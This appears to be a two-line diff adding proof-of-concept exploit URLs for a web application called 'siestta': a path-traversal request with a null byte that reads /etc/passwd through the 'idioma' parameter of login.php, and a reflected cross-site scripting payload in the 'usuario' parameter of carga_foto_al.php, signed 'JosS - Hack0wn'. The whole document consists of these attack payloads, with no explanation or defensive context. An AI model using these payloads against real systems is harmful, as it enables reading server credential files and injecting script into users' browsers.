@@ -1,0 +1,2 @@
+http://www.example.com/siestta/login.php?idioma=/../../../../../../../../../../../etc/passwd%00
+http://www.example.com/siestta/carga_foto_al.php?usuario=&lt;script&gt;alert(&quot;JosS - Hack0wn&quot;);&lt;/script&gt;
